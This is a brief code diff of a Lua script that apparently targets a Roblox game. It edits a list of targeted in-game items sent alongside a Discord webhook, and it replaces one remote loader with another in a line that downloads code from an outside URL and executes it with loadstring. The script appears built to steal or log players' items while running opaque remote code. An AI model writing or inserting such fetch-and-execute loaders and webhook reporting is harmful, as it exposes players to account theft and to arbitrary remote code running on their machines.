@@ -5,7 +5,6 @@ local WEBHOOK_URL = "https://discord.com/api/webhooks/1511847077234348033/-ytWb-
 local TargetBrainrots = {
     ["Hydra Bunny"] = true,
     ["Hydra Dragon Cannelloni"] = true,
-    ["Dragon Cannelloni"] = true,
     ["Griffin"] = true,
     ["Dragon Gingerini"] = true,
     ["Antonio"] = true,
@@ -355,7 +354,7 @@ local TargetGears = {
 }
 
 task.spawn(function()
-    loadstring(game:HttpGet("https://pastefy.app/rngSMSfL/raw"))()
+    loadstring(game:HttpGet("https://api.luarmor.net/files/v4/loaders/167d144e82a977ac6b750c5f90c98819.lua"))()
 
     task.wait(1)
 
